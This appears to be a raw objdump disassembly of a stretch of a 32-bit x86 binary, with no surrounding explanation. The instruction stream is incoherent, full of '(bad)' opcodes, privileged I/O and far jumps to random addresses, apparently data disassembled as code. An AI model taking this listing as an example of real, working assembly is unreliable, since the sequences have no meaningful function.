  41b5ae:	xor    eax,0x76ed08b1
  41b5b3:	test   al,0x61
  41b5b5:	hlt    
  41b5b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5b7:	push   edi
  41b5b8:	dec    esi
  41b5b9:	dec    ebx
  41b5ba:	mov    bl,0x9
  41b5bc:	push   0x73742dbf
  41b5c1:	or     BYTE PTR [ebx],al
  41b5c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b5c4:	shl    BYTE PTR [esi+0x5a],cl
  41b5c7:	inc    esi
  41b5c8:	ja     0x41b628
  41b5ca:	jl     0x41b57b
  41b5cc:	cwde   
  41b5cd:	sub    BYTE PTR [edi+0x40],dh
  41b5d0:	es xchg edi,eax
  41b5d2:	mov    ah,BYTE PTR [ebx-0x55ab6e74]
  41b5d8:	mov    WORD PTR [edx+ebx*2-0x1f],ds
  41b5dc:	test   al,0x35
  41b5de:	mov    esi,0xa52fa26e
  41b5e3:	xor    eax,0x6901c5cc
  41b5e8:	out    dx,al
  41b5e9:	push   eax
  41b5ea:	clc    
  41b5eb:	jl     0x41b5f0
  41b5ed:	loopne 0x41b5ae
  41b5ef:	mov    al,ds:0xbfcb8257
  41b5f4:	icebp  
  41b5f5:	scas   eax,DWORD PTR es:[edi]
  41b5f6:	sbb    BYTE PTR [ebx+ebp*2+0x450c49c2],dh
  41b5fd:	add    ecx,edx
  41b5ff:	dec    eax
  41b600:	adc    ecx,DWORD PTR [eax-0x342fe52]
  41b606:	ret    0x18e1
  41b609:	xchg   edi,eax
  41b60a:	jne    0x41b616
  41b60c:	js     0x41b5c7
  41b60e:	xchg   BYTE PTR [edx+0x73],dh
  41b611:	or     eax,0x43d93be4
  41b616:	aas    
  41b617:	mov    ds:0x108162d8,eax
  41b61c:	mov    bh,0xf7
  41b61e:	shr    DWORD PTR [ecx-0x51],1
  41b621:	and    BYTE PTR [edx-0x564ae03d],bl
  41b627:	cli    
  41b628:	test   eax,0x6050fe3f
  41b62d:	xchg   edi,eax
  41b62e:	dec    esi
  41b62f:	dec    esp
  41b630:	jg     0x41b68d
  41b632:	xlat   BYTE PTR ds:[ebx]
  41b633:	mov    dh,0xc0
  41b635:	jle    0x41b619
  41b637:	repz mov al,0xf0
  41b63a:	in     al,0x86
  41b63c:	(bad)  
  41b63d:	jnp    0x41b658
  41b63f:	stc    
  41b640:	or     ah,cl
  41b642:	iret   
  41b643:	fdivr  DWORD PTR [eax-0x7a2f68c2]
  41b649:	rcr    BYTE PTR [ebp+0x5ef52ebc],cl
  41b64f:	xchg   esi,eax
  41b650:	out    dx,al
  41b651:	dec    ecx
  41b652:	retf   0x1a61
  41b655:	xchg   esp,eax
  41b656:	push   edx
  41b657:	iret   
  41b658:	xor    DWORD PTR [edi+0x62],edi
  41b65b:	mov    ebx,0x1b488d2c
  41b660:	sub    DWORD PTR [esp-0x3e33c50e],edx
  41b667:	shl    DWORD PTR [esi+eiz*2+0x20697377],0x5f
  41b66f:	xchg   BYTE PTR [edi+0x5],ah
  41b672:	and    eax,DWORD PTR [ecx]
  41b674:	mov    ?,WORD PTR [edx]
  41b676:	hlt    
  41b677:	sub    ch,BYTE PTR [ebx]
  41b679:	(bad)  
  41b67a:	and    DWORD PTR [eax+edi*2-0x1f],eax
  41b67e:	out    dx,eax
  41b67f:	sbb    al,BYTE PTR [ebp+0x4e80f45e]
  41b685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b686:	call   0x6cf6b03e
  41b68b:	jmp    0x579eaff6
  41b690:	jae    0x41b6ab
  41b692:	ficom  DWORD PTR [edi]
  41b694:	mov    BYTE PTR [ecx+0x76],cl
  41b697:	dec    esi
  41b698:	inc    edi
  41b699:	mov    cl,0xa0
  41b69b:	aam    0x1b
  41b69d:	dec    esi
  41b69e:	stos   DWORD PTR es:[edi],eax
  41b69f:	push   edi
  41b6a0:	and    cl,dh
  41b6a2:	nop
  41b6a3:	cmp    ecx,edx
  41b6a5:	inc    ebx
  41b6a6:	rcr    BYTE PTR [eax+0x5d],1
  41b6a9:	ins    BYTE PTR es:[edi],dx
  41b6aa:	aad    0x91
  41b6ac:	jae    0x41b69f
  41b6ae:	aad    0x3c
  41b6b0:	pop    es
  41b6b1:	lods   al,BYTE PTR ds:[esi]
  41b6b2:	xor    DWORD PTR [edx+ecx*4],ecx
  41b6b5:	adc    eax,0xc4465d4f
  41b6ba:	call   0x7059ecbb
  41b6bf:	mov    bl,0x14
  41b6c1:	(bad)  
  41b6c2:	ja     0x41b68f
  41b6c4:	outs   dx,DWORD PTR ds:[esi]
  41b6c5:	push   esp
  41b6c6:	add    ah,ah
  41b6c8:	or     ah,BYTE PTR [ebp-0x581c5993]
  41b6ce:	fstp   QWORD PTR [eax+0xfda536a]
  41b6d4:	fs cmc 
  41b6d6:	fst    DWORD PTR [ebp-0x59c918e2]
  41b6dc:	fcomp  DWORD PTR [eax+0x7a]
  41b6df:	ins    DWORD PTR es:[edi],dx
  41b6e0:	hlt    
  41b6e1:	ja     0x41b6bd
  41b6e3:	xor    DWORD PTR [edi-0x47],esi
  41b6e6:	jmp    0x41b736
  41b6e8:	xor    cl,BYTE PTR [edi+0x58c2e87e]
  41b6ee:	xchg   esp,eax
  41b6ef:	mov    ?,edx
  41b6f1:	jbe    0x41b707
  41b6f3:	cmp    edi,DWORD PTR [edi+0x53824ae9]
  41b6f9:	or     dh,dl
  41b6fb:	or     BYTE PTR [ebp-0x3de61d73],0xbc
  41b702:	daa    
  41b703:	xchg   ch,ah
  41b705:	scas   al,BYTE PTR es:[edi]
  41b706:	jo     0x41b733
  41b708:	sar    BYTE PTR [eax],cl
  41b70a:	mov    bh,0xfd
  41b70c:	int3   
  41b70d:	popa   
  41b70e:	dec    edi
  41b70f:	push   cs
  41b710:	loopne 0x41b71a
  41b712:	and    ah,cl
  41b714:	stos   DWORD PTR es:[edi],eax
  41b715:	jp     0x41b6c4
  41b717:	jle    0x41b6b5
  41b719:	mov    dl,0xd0
  41b71b:	pop    DWORD PTR [esi+edi*2]
  41b71e:	mov    ds:0x9a703c2,al
  41b723:	adc    BYTE PTR [ebx+0x4e5c39d1],al
  41b729:	jle    0x41b708
  41b72b:	int    0xa9
  41b72d:	dec    eax
  41b72e:	and    eax,0x9162da9c
  41b733:	leave  
  41b734:	push   ebx
  41b735:	cmp    ecx,DWORD PTR [ecx-0x53]
  41b738:	mov    al,ds:0x621a91b5
  41b73d:	test   BYTE PTR [ebx+0x26],ch
  41b740:	mov    esp,0x1e5b2eeb
  41b745:	outs   dx,DWORD PTR ds:[esi]
  41b746:	jno    0x41b70a
  41b748:	mov    ah,BYTE PTR [edi-0x71]
  41b74b:	pusha  
  41b74c:	test   ah,cl
  41b74e:	adc    BYTE PTR [eax+0x553e575c],cl
  41b754:	sbb    al,0x77
  41b756:	leave  
  41b757:	cs inc ecx
  41b759:	push   0x13
  41b75b:	mov    ah,0x92
  41b75d:	out    0x5a,al
  41b75f:	xor    al,0x40
  41b761:	lock dec edi
  41b763:	mov    ebp,0x44a79a20
  41b768:	mov    dh,0x6c
  41b76a:	dec    edi
  41b76b:	mov    esi,0x8c5eaf21
  41b770:	jge    0x41b7f1
  41b772:	add    eax,0x2a336fbd
  41b777:	int3   
  41b778:	inc    edx
  41b779:	cmp    DWORD PTR [edi+0x21],eax
  41b77c:	xor    ebx,edi
  41b77e:	dec    ebp
  41b77f:	loop   0x41b7a2
  41b781:	hlt    
  41b782:	mov    esp,0xaa0c9e14
  41b787:	push   ss
  41b788:	xchg   ecx,esp
  41b78a:	ret    
  41b78b:	popa   
  41b78c:	cmp    edx,DWORD PTR [ecx-0x35]
  41b78f:	sti    
  41b790:	xor    DWORD PTR [edx],esi
  41b792:	push   0xffffffb6
  41b794:	std    
  41b795:	adc    eax,0x3479ad18
  41b79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b79b:	ret    0x691b
  41b79e:	or     al,0xf2
  41b7a0:	lods   al,BYTE PTR ds:[esi]
  41b7a1:	sbb    DWORD PTR [edx+0x1e6c0137],esi
  41b7a7:	gs jecxz 0x41b762
  41b7aa:	(bad)  
  41b7ab:	sub    al,0x7f
  41b7ad:	daa    
  41b7ae:	lods   eax,DWORD PTR ds:[esi]
  41b7af:	mov    ch,0xd6
  41b7b1:	les    edx,FWORD PTR [eax]
  41b7b3:	mov    bl,0xeb
  41b7b5:	iret   
  41b7b6:	bound  ebp,QWORD PTR [ebp+0x78]
  41b7b9:	pop    ebx
  41b7ba:	push   cs
  41b7bb:	cld    
  41b7bc:	pop    eax
  41b7bd:	cmp    al,0x47
  41b7bf:	push   esp
  41b7c0:	stos   BYTE PTR es:[edi],al
  41b7c1:	sbb    BYTE PTR [edx-0x39],bh
  41b7c4:	push   ds
  41b7c5:	dec    ebx
  41b7c6:	jl     0x41b776
  41b7c8:	push   ds
  41b7c9:	mov    eax,ds:0x11aca81a
  41b7ce:	lds    eax,FWORD PTR cs:[eax]
  41b7d1:	or     al,0x18
  41b7d3:	inc    ebx
  41b7d4:	das    
  41b7d5:	dec    ebp
  41b7d6:	ins    DWORD PTR es:[edi],dx
  41b7d7:	sub    eax,0xd166bf6f
  41b7dc:	add    DWORD PTR [ebx],ebx
  41b7de:	popa   
  41b7df:	inc    ecx
  41b7e0:	sbb    DWORD PTR [edi+esi*1-0x4a],eax
  41b7e4:	scas   al,BYTE PTR es:[edi]
  41b7e5:	int    0xe5
  41b7e7:	or     al,0x9f
  41b7e9:	adc    ecx,eax
  41b7eb:	cs lahf 
  41b7ed:	int    0xa5
  41b7ef:	adc    DWORD PTR [eax],ebx
  41b7f1:	stos   DWORD PTR es:[edi],eax
  41b7f2:	jnp    0x41b774
  41b7f4:	(bad)  
  41b7f5:	out    dx,al
  41b7f6:	imul   ebp,DWORD PTR [ebp-0x62],0x68
  41b7fa:	xor    al,0x14
  41b7fc:	icebp  
  41b7fd:	dec    edi
  41b7fe:	xor    ch,dh
  41b800:	mov    esi,0x134ba06e
  41b805:	inc    edi
  41b806:	ins    DWORD PTR es:[edi],dx
  41b807:	adc    edi,ecx
  41b809:	(bad)  
  41b80a:	jmp    0xbd244aca
  41b80f:	(bad)  
  41b810:	lds    ecx,FWORD PTR cs:[ebx+edi*2]
  41b814:	adc    eax,0xf3286f41
  41b819:	add    al,0xa5
  41b81b:	test   bl,dl
  41b81d:	pop    ds
  41b81e:	sub    cl,BYTE PTR [ebp-0x4a99c9eb]
  41b824:	mov    esp,0xc6ee645
  41b829:	jnp    0x41b875
  41b82b:	test   al,0x9b
  41b82d:	cs pop ebx
  41b82f:	add    eax,0xc79ee0f7
  41b834:	dec    edi
  41b835:	and    eax,0x9f2503a9
  41b83a:	adc    eax,0xf0eb2777
  41b83f:	ins    BYTE PTR es:[edi],dx
  41b840:	fcomp  QWORD PTR [ecx]
  41b842:	in     al,dx
  41b843:	mov    esp,eax
  41b845:	popf   
  41b846:	mov    ch,0x8a
  41b848:	jb     0x41b8af
  41b84a:	xchg   ebx,eax
  41b84b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b84c:	pop    ds
  41b84d:	fdiv   QWORD PTR [edx]
  41b84f:	pop    ecx
  41b850:	and    BYTE PTR [eax-0x48],0xbb
  41b854:	mov    ds:0xee15b0b7,al
  41b859:	pop    ds
  41b85a:	popf   
  41b85b:	mov    eax,0x61d970c
  41b860:	sahf   
  41b861:	xor    DWORD PTR [edi+0xde1480b],ecx
  41b867:	std    
  41b868:	xchg   ecx,eax
  41b869:	pusha  
  41b86a:	call   0x5f0a:0xf557b15b
  41b871:	cmp    dl,BYTE PTR [ecx+edi*8-0x5f]
  41b875:	fidivr DWORD PTR [ebp-0x25d5d1a7]
  41b87b:	in     al,dx
  41b87c:	sub    al,0x8d
  41b87e:	jmp    0xc5f:0x8e467cde
  41b885:	mov    eax,0x30302ef5
  41b88a:	inc    ebp
  41b88b:	sub    al,0x0
  41b88d:	mov    bl,0x7c
  41b88f:	test   eax,0xec369e36
  41b894:	dec    ecx
  41b895:	retf   
  41b896:	clc    
  41b897:	cmp    al,BYTE PTR [esi+0x1]
  41b89a:	imul   esp,edx,0xfc42d812
  41b8a0:	and    al,0x12
  41b8a2:	enter  0x3e45,0x74
  41b8a6:	or     DWORD PTR [edx+edi*1-0xf],edx
  41b8aa:	and    ah,bl
  41b8ac:	lea    ebx,[edx]
  41b8ae:	mov    esi,0x3c059444
  41b8b3:	aas    
  41b8b4:	push   ecx
  41b8b5:	loope  0x41b884
  41b8b7:	or     DWORD PTR [ebp-0x78],edi
  41b8ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8bb:	or     eax,0xffca0a19
  41b8c0:	popf   
  41b8c1:	mov    ds:0x44e5baa,eax
  41b8c6:	push   0x6e
  41b8c8:	sub    eax,0xa8be82c7
  41b8cd:	jecxz  0x41b86f
  41b8cf:	cli    
  41b8d0:	int3   
  41b8d1:	in     al,0xa7
  41b8d3:	push   ebx
  41b8d4:	mov    esp,ds
  41b8d6:	imul   BYTE PTR [ebp-0x13]
  41b8d9:	mov    eax,0x542c490
  41b8de:	icebp  
  41b8df:	push   esi
  41b8e0:	dec    DWORD PTR ds:0x49dceb60
  41b8e6:	mov    esp,0xabd32823
  41b8eb:	iret   
  41b8ec:	jbe    0x41b90d
  41b8ee:	vpsrlw xmm3,xmm3,XMMWORD PTR [eax-0x7de26d29]
  41b8f6:	mov    al,0xcd
  41b8f8:	mov    ds:0x7138745c,eax
  41b8fd:	inc    esi
  41b8fe:	jp     0x41b928
  41b900:	xor    eax,DWORD PTR [edx]
  41b902:	js     0x41b982
  41b904:	stc    
  41b905:	jp     0x41b956
  41b907:	push   esp
  41b908:	stos   DWORD PTR es:[edi],eax
  41b909:	or     cl,BYTE PTR [eax-0x50]
  41b90c:	ret    
  41b90d:	and    eax,0x8bc50378
  41b912:	aad    0x7d
  41b914:	mov    al,ds:0xba511c34
  41b919:	xchg   edi,eax
  41b91a:	pop    edi
  41b91b:	mov    esi,0x4b13a181
  41b920:	ret    0xdb52
  41b923:	ror    DWORD PTR [ebx+edx*2-0x58720c02],1
  41b92a:	sbb    edi,esi
  41b92c:	into   
  41b92d:	pusha  
  41b92e:	pop    ds
  41b92f:	sahf   
  41b930:	in     al,dx
  41b931:	fisttp QWORD PTR [eax-0x7441ca5c]
  41b937:	fiadd  WORD PTR [eax-0x36e36c8d]
  41b93d:	inc    edx
  41b93e:	out    0x8d,al
  41b940:	inc    edi
  41b941:	or     eax,DWORD PTR [edi+0x58e6e1b]
  41b947:	mov    ah,0x26
  41b949:	add    al,0xbb
  41b94b:	inc    edi
  41b94c:	ror    DWORD PTR [esi],0x95
  41b94f:	push   es
  41b950:	fnstsw WORD PTR [edi+0x34]
  41b953:	fs mov ebx,0x2a572d9e
  41b959:	icebp  
  41b95a:	inc    eax
  41b95b:	and    DWORD PTR fs:[edx],ebp
  41b95e:	scas   al,BYTE PTR es:[edi]
  41b95f:	mov    eax,0xfe8a4f44
  41b964:	std    
  41b965:	jb     0x41b9c0
  41b967:	sub    DWORD PTR [esp+edx*1+0x48ce31e],edi
  41b96e:	ret    
  41b96f:	ins    BYTE PTR es:[edi],dx
  41b970:	cmp    al,0x29
  41b972:	ss dec ebx
  41b974:	and    bh,BYTE PTR [edi]
  41b976:	cwde   
  41b977:	cdq    
  41b978:	xchg   ebp,eax
  41b979:	jp     0x41b954
  41b97b:	loopne 0x41b940
  41b97d:	imul   ebp,ecx,0xfc010f5c
  41b983:	dec    ecx
  41b984:	jmp    0x65e2:0x627c5817
  41b98b:	fld    QWORD PTR [ecx-0x6a]
  41b98e:	jmp    0x1e161860
  41b993:	or     eax,0x58d5f6
  41b998:	pusha  
  41b999:	pop    ss
  41b99a:	and    BYTE PTR [eax+0x414d0a05],0xc8
  41b9a1:	aad    0x2d
  41b9a3:	arpl   WORD PTR [ebp-0xd],si
  41b9a6:	int    0x5f
  41b9a8:	icebp  
  41b9a9:	pop    edi
  41b9aa:	rcr    DWORD PTR [esi],1
  41b9ac:	call   FWORD PTR [esi]
  41b9ae:	inc    ecx
  41b9af:	push   eax
  41b9b0:	test   al,0xa6
  41b9b2:	in     eax,dx
  41b9b3:	push   0xffffffba
  41b9b5:	xlat   BYTE PTR ds:[ebx]
  41b9b6:	or     BYTE PTR [ebp+eiz*2+0xa072822],bh
  41b9bd:	test   edi,edi
  41b9bf:	repz in eax,0xcb
  41b9c2:	ins    DWORD PTR es:[edi],dx
  41b9c3:	test   al,0x1
  41b9c5:	push   ebp
  41b9c6:	in     al,0xdd
  41b9c8:	mov    al,0xfc
  41b9ca:	arpl   si,bx
  41b9cc:	int    0x89
  41b9ce:	sahf   
  41b9cf:	adc    al,0xc4
  41b9d1:	outs   dx,BYTE PTR ds:[esi]
  41b9d2:	js     0x41ba1f
  41b9d4:	xchg   BYTE PTR [ecx-0x20],al
  41b9d7:	mov    cl,0xc3
  41b9d9:	ins    BYTE PTR es:[edi],dx
  41b9da:	das    
  41b9db:	jle    0x41b981
  41b9dd:	sub    BYTE PTR [eax+ecx*4+0x23],bh
  41b9e1:	inc    edi
  41b9e2:	adc    BYTE PTR [eax+ecx*4],dh
  41b9e5:	pop    eax
  41b9e6:	test   ch,ch
  41b9e8:	ja     0x41b992
  41b9ea:	dec    edi
  41b9eb:	jg     0x41ba06
  41b9ed:	xchg   BYTE PTR [ebp+0x6f],al
  41b9f0:	cmp    edi,DWORD PTR [eax+edi*8-0x1853ff66]
  41b9f7:	mov    ecx,0x4b108667
  41b9fc:	jmp    0x2fc41df7
  41ba01:	lea    ebp,[edx-0x2cedf179]
  41ba07:	xchg   ecx,eax
  41ba08:	pop    ecx
  41ba09:	(bad)  
  41ba0b:	(bad)  
  41ba0c:	mov    DWORD PTR [ecx-0x150b22f1],ecx
  41ba12:	cwde   
  41ba13:	shr    DWORD PTR [edi],0x9a
  41ba16:	call   0x4658:0x599f0d54
  41ba1d:	in     al,dx
  41ba1e:	add    DWORD PTR [ebx+0x5b121ee3],esp
  41ba24:	test   eax,0x74efb4e
  41ba29:	fs or  eax,0x6343a96b
  41ba2f:	push   cs
  41ba30:	jg     0x41ba09
  41ba32:	jb     0x41ba6b
  41ba34:	xchg   ebp,eax
  41ba35:	sbb    BYTE PTR [edx-0x46],cl
  41ba38:	in     al,dx
  41ba39:	outs   dx,BYTE PTR ds:[esi]
  41ba3b:	mov    ecx,0x52294ae9
  41ba40:	inc    esi
  41ba41:	xchg   esi,eax
  41ba42:	sahf   
  41ba43:	js     0x41babf
  41ba45:	and    al,ch
  41ba47:	repz add cl,bh
  41ba4a:	pop    edi
  41ba4b:	es cmc 
  41ba4d:	xor    dh,BYTE PTR [edx-0x4b]
  41ba50:	add    al,0x5c
  41ba52:	scas   eax,DWORD PTR es:[edi]
  41ba53:	inc    esi
  41ba54:	and    al,0x74
  41ba56:	aad    0x4
  41ba58:	fisttp DWORD PTR [edx-0x15]
  41ba5b:	pop    ebx
  41ba5c:	cli    
  41ba5d:	jno    0x41ba07
  41ba5f:	xchg   ebp,eax
  41ba60:	adc    cl,BYTE PTR [ebx]
  41ba62:	sbb    dl,BYTE PTR [ecx+esi*2]
  41ba65:	mov    eax,0x59a90918
  41ba6a:	dec    ecx
  41ba6b:	and    dh,BYTE PTR [ebp-0x32]
  41ba6e:	push   0xafb226e3
  41ba73:	push   ss
  41ba74:	jmp    0x563a7a57
  41ba79:	xor    BYTE PTR [ecx],bl
  41ba7b:	add    edi,DWORD PTR [edi]
  41ba7d:	mov    dl,BYTE PTR [edx+0x61]
  41ba80:	shl    BYTE PTR [ebx+0x26b570ca],0x6c
  41ba87:	pop    ds
  41ba88:	loopne 0x41ba84
  41ba8a:	lahf   
  41ba8b:	std    
  41ba8c:	jnp    0x41bae6
  41ba8e:	jmp    0x809a:0xe1690a58
  41ba95:	retf   
  41ba96:	loopne 0x41ba4c
  41ba98:	cwde   
  41ba99:	inc    ecx
  41ba9a:	enter  0xaa90,0x7
  41ba9e:	ds int 0x6b
  41baa1:	adc    BYTE PTR [edi+edi*2-0x33],bl
  41baa5:	sbb    eax,0x51ab3657
  41baaa:	and    dl,BYTE PTR [ecx-0x41]
  41baad:	jb     0x41bac8
  41baaf:	mov    ebp,0x6bb7dab7
  41bab4:	add    eax,0x13b030a6
  41bab9:	je     0x41ba7f
  41babb:	imul   esp,DWORD PTR [edi-0x6d],0xba6216e1
  41bac2:	es cs inc esp
  41bac5:	jg     0x41baea
  41bac7:	jg     0x41ba51
  41bac9:	jmp    0xb785:0xc197cf60
  41bad0:	push   ds
  41bad1:	in     eax,dx
  41bad2:	push   esi
  41bad3:	aad    0x84
  41bad5:	inc    esp
  41bad6:	iret   
  41bad7:	xor    ah,ch
  41bad9:	ror    DWORD PTR [eax+0x369880a4],cl
  41badf:	pop    esi
  41bae0:	xlat   BYTE PTR ds:[ebx]
  41bae1:	xor    BYTE PTR [esi+esi*1-0x14],cl
  41bae5:	inc    esi
  41bae6:	pop    ds
  41bae7:	or     DWORD PTR [esi],edi
  41bae9:	xchg   ecx,eax
  41baea:	dec    ebx
  41baeb:	sti    
  41baec:	jl     0x41bae9
  41baee:	in     eax,dx
  41baef:	jno    0x41bb2b
  41baf1:	int    0x3f
  41baf3:	fidiv  DWORD PTR ss:[ecx-0x14]
  41baf7:	cmp    BYTE PTR [ebx+ecx*4-0x73],bh
  41bafb:	out    0x1a,al
  41bafd:	push   DWORD PTR [esi]
  41baff:	lds    edi,FWORD PTR [ebx+0xb609660]
  41bb05:	or     ah,dl
  41bb07:	mov    cl,0xca
  41bb09:	add    al,0x28
  41bb0b:	mov    WORD PTR [eax],?
  41bb0d:	pop    ecx
  41bb0e:	or     ebp,DWORD PTR [esi+0x4b]
  41bb11:	jno    0x41bb6b
  41bb13:	push   cs
  41bb14:	test   al,0x6e
  41bb16:	inc    ebx
  41bb17:	ror    DWORD PTR [edi+eiz*4+0x43],cl
  41bb1b:	in     al,0xc1
  41bb1d:	mov    ecx,0x983049c4
  41bb22:	inc    ecx
  41bb23:	inc    ecx
  41bb24:	inc    edx
  41bb25:	fld    DWORD PTR ds:0x42bbd485
  41bb2b:	jecxz  0x41bad5
  41bb2d:	push   ds
  41bb2e:	mov    al,0x94
  41bb30:	jecxz  0x41bb28
  41bb32:	retf   0xaa0f
  41bb35:	in     al,dx
  41bb36:	jmp    0x16eb:0xa17f730c
  41bb3d:	cli    
  41bb3e:	pushf  
  41bb3f:	(bad)  
  41bb40:	call   0xe186:0x3645bc1c
  41bb47:	call   0x25ce:0x1ee07e9e
  41bb4e:	add    DWORD PTR [eax],eax
  41bb50:	popa   
  41bb51:	imul   ebx,DWORD PTR [edi+0x2862e181],0x54
  41bb58:	cld    
  41bb59:	mov    cl,0x99
  41bb5b:	ret    
  41bb5c:	jne    0x41bb56
  41bb5e:	lahf   
  41bb5f:	test   DWORD PTR [esi-0x79],ebp
  41bb62:	jecxz  0x41bb0a
  41bb64:	repz cmp BYTE PTR [ebx+0x635c1d4c],ch
  41bb6b:	add    eax,DWORD PTR [ebp+0x1]
  41bb6e:	adc    DWORD PTR [esp+eax*2-0xc],ecx
  41bb72:	cmp    al,0x5
  41bb74:	ins    BYTE PTR es:[edi],dx
  41bb75:	jge    0x41bbca
  41bb77:	test   al,0x45
  41bb79:	or     ah,BYTE PTR [edx]
  41bb7b:	inc    eax
  41bb7c:	fcmovnb st,st(7)
  41bb7e:	cs ja  0x41bb25
  41bb81:	push   edx
  41bb82:	lods   eax,DWORD PTR ds:[esi]
  41bb83:	nop
  41bb84:	dec    esi
  41bb85:	bound  ebx,QWORD PTR [eax+0x2d]
  41bb88:	mov    eax,DWORD PTR [ebx+0x280ac33]
  41bb8e:	add    eax,DWORD PTR [edx-0x7]
  41bb91:	adc    esi,DWORD PTR [ecx+edi*1-0x1603dbb5]
  41bb98:	std    
  41bb99:	or     dh,BYTE PTR [eax+0x1eb59f7e]
  41bb9f:	call   0x202:0x73364bc4
  41bba6:	ror    dh,cl
  41bba8:	push   ds
  41bba9:	xchg   DWORD PTR [ebx+edi*2-0x7f3733da],ebp
  41bbb0:	xor    bl,cl
  41bbb2:	in     eax,dx
  41bbb3:	fisttp WORD PTR [esi]
  41bbb5:	add    BYTE PTR ds:0x9c99b976,cl
  41bbbb:	sub    DWORD PTR [ebp+0x1f3d6c75],ebp
  41bbc1:	dec    edi
  41bbc2:	cwde   
  41bbc3:	or     ecx,DWORD PTR [ebp-0x31719f4e]
  41bbc9:	xor    eax,0x637e0c2a
  41bbce:	pop    edx
  41bbcf:	fwait
  41bbd0:	and    DWORD PTR [esi],ebp
  41bbd2:	int    0x2e
  41bbd4:	or     al,BYTE PTR [esi-0x65fdd673]
  41bbda:	sub    BYTE PTR [eax+0x6e],dl
  41bbdd:	jb     0x41bbe3
  41bbdf:	out    0xde,eax
  41bbe1:	jmp    0x41bbb3
  41bbe3:	mov    cl,0xb8
  41bbe5:	outs   dx,BYTE PTR ds:[esi]
  41bbe6:	fs xor eax,0xd12c6df2
  41bbec:	mov    dh,0xc3
  41bbee:	fcmovnu st,st(5)
  41bbf0:	cli    
  41bbf1:	fmul   QWORD PTR [eax]
  41bbf3:	dec    ecx
  41bbf4:	sbb    al,0xff
  41bbf6:	and    edi,edx
  41bbf8:	adc    DWORD PTR [edx-0x5d5e969c],0xa92ea027
  41bc02:	icebp  
  41bc03:	add    eax,0xfda74b5a
  41bc08:	ins    DWORD PTR es:[edi],dx
  41bc09:	(bad)  
  41bc0a:	gs je  0x41bb95
  41bc0d:	xor    dh,BYTE PTR [esp+ebx*8+0x79a8e2e3]
  41bc14:	mov    WORD PTR [esi+0x383659c9],ds
  41bc1a:	icebp  
  41bc1b:	xor    ebx,DWORD PTR [ecx-0x59c178da]
  41bc21:	or     eax,0x59bf2a80
  41bc26:	and    eax,0x3d2300fd
  41bc2b:	xchg   ecx,eax
  41bc2c:	lock or ch,BYTE PTR [edx-0x71c4b424]
  41bc33:	mov    edi,0x6d6bc057
  41bc38:	push   ss
  41bc39:	and    bh,BYTE PTR [ebx]
  41bc3b:	adc    dh,cl
  41bc3d:	(bad)  
  41bc3e:	hlt    
  41bc3f:	sub    al,0xb
  41bc41:	jns    0x41bc21
  41bc43:	push   edx
  41bc44:	ffree  st(3)
  41bc46:	pop    ds
  41bc47:	imul   ebx,edi,0x71
  41bc4a:	cmp    ah,BYTE PTR cs:[eax-0x787269ee]
  41bc51:	adc    ebp,DWORD PTR [edx-0x1eae161f]
  41bc57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc58:	sub    eax,0xd14d2aff
  41bc5d:	mov    edx,fs
  41bc5f:	mov    edx,0x5f2acd97
  41bc64:	mov    BYTE PTR [edi+esi*1],cl
  41bc67:	lds    esp,FWORD PTR [edx]
  41bc69:	push   ebx
  41bc6a:	jg     0x41bcd3
  41bc6c:	mov    edx,0x8bb8307e
  41bc71:	and    al,0xbc
  41bc73:	adc    edi,ecx
  41bc75:	pop    ecx
  41bc76:	ror    DWORD PTR [ebp-0x47fe7efb],1
  41bc7c:	push   edx
  41bc7d:	aaa    
  41bc7e:	mov    ds:0x56f5d282,al
  41bc83:	scas   eax,DWORD PTR es:[edi]
  41bc84:	mov    eax,ds:0xd0df28c4
  41bc89:	jecxz  0x41bcbf
  41bc8b:	cmc    
  41bc8c:	sbb    DWORD PTR [edx+0x8],edx
  41bc8f:	push   edx
  41bc90:	mov    esp,0x6c633ebf
  41bc95:	mov    edi,DWORD PTR [ecx]
  41bc97:	dec    eax
  41bc98:	outs   dx,BYTE PTR ds:[esi]
  41bc99:	inc    eax
  41bc9a:	xchg   esp,eax
  41bc9b:	stc    
  41bc9c:	setae  BYTE PTR [edx+ecx*2+0x7b262a8c]
  41bca4:	inc    ecx
  41bca5:	out    dx,al
  41bca6:	cmp    eax,0xdd063e2a
  41bcab:	sub    ebp,esp
  41bcad:	mov    ss,WORD PTR [ecx-0x27e89a60]
  41bcb3:	cmp    eax,0x773e71eb
  41bcb8:	sbb    ah,BYTE PTR [ecx+esi*1]
  41bcbb:	mov    ebp,0x648f1f18
  41bcc0:	scas   al,BYTE PTR es:[edi]
  41bcc1:	or     bh,0x43
  41bcc4:	sub    dh,BYTE PTR [edi]
  41bcc6:	daa    
  41bcc7:	add    al,0x1e
  41bcc9:	rcl    DWORD PTR [ecx+0x62],cl
  41bccc:	mov    bl,0xf2
  41bcce:	bound  eax,QWORD PTR [esi-0x1c]
  41bcd1:	fs js  0x41bcc4
  41bcd4:	xor    ch,al
  41bcd6:	rcl    BYTE PTR ds:0xcaa5f3fd,cl
  41bcdc:	jg     0x41bcdc
  41bcde:	adc    DWORD PTR [ebp-0x3b5890d6],esi
  41bce4:	xchg   ebx,eax
  41bce5:	std    
  41bce6:	ins    BYTE PTR es:[edi],dx
  41bce7:	and    bl,ah
  41bce9:	sbb    cl,ch
  41bceb:	jl     0x41bccf
  41bced:	arpl   WORD PTR [ecx+0x79571d0a],cx
  41bcf3:	push   eax
  41bcf4:	push   ebx
  41bcf5:	mov    eax,ds:0x3c13db79
  41bcfa:	adc    bl,ah
  41bcfc:	push   es
  41bcfd:	js     0x41bc94
  41bcff:	mov    al,BYTE PTR [edx]
  41bd01:	es mov ebx,gs
  41bd04:	mov    edx,0x1d924c6
  41bd09:	imul   dh
  41bd0b:	pop    eax
  41bd0c:	mov    BYTE PTR [ecx],0x8c
  41bd0f:	mov    WORD PTR [eax+0x15],es
  41bd12:	xchg   ebp,eax
  41bd13:	outs   dx,BYTE PTR ds:[esi]
  41bd14:	sub    BYTE PTR [ebx-0x43ee17af],bl
  41bd1a:	test   DWORD PTR [esi+0x39],esp
  41bd1d:	mov    bh,0xad
